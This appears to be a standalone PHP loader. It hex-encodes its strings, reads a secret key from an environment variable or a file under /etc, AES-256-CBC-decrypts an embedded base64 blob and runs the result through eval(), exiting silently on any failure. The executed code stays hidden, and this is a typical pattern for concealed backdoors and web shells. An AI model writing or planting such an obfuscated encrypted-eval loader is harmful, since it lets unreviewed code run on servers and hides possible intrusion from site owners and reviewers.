<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
if(!$k)exit;
$i=base64_decode('0U+HgYe6by0UZKVx+9UQKQ==');
$c=base64_decode(
'lKIPymeyUlEvRt7ib/sHRXu5pBHsafaAxi3xB7M+22ro50eVt23kvOULOv5TQxKA4BYYM5gPjC8q' .
'zOiW91NyLcPa1DJFj8AQshLPzR2w9UmzrToUZkd9HHn2cYXQOhXGahKttIDnrbDa/DG4eCMQWpTK' .
'L4RkQnBrjE20b3IK0SALfzAUX2plaKZLFK9IwmMGxXFjE7h+vmRqZQcjSIaLKAZP3HCnRW8xHbK/' .
'7F91z0sOGwE5UJ4TGqpvrQGgSnMH3Dgiry5Xb2QsecxHNNN7QnFlnuFBwGZdkoddTmrVtgzkmUz0' .
'agm7AVdEdZMI0TcptZMSwUjsYI8x+uXofppcIxhp3UxxQ2ulTfPnvlvEoHqhc0gsn7PfoPbDhygb' .
'j+7H1470+yyJsrL4Uvrws6JkTySaT2M2srwyXD+D08OP+TuaRT32i4+yjV4zbE8bVcKFqRpHBwwA' .
'RXzYH3LNhDB3ShFmI5GM3bBTi1XiL6f47u9m4D6NyLJRepy0RdCKF2ngmVWHWxe9PEMpE7/8vifO' .
'zPgj4HJnvCl7url1kuIDOe/Kc/JlnwXX2PGWBTv9h0DmAuiOPAbg4MfJZFK6RoquwWwcHzjbWdlq' .
'fBXj2ssRS056m1yGAtKWBH9JlFbOMCxW1LI/gOv3yWYtTTCLSOWkWPgEv7PaGSatNKOgWrs0oZuP' .
'p1sCLG9Fpe1DHChwhjyWhdFiQZBh4b2rx/ornDz5Sg=='
);
$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
if($d===false)exit;
eval($d);
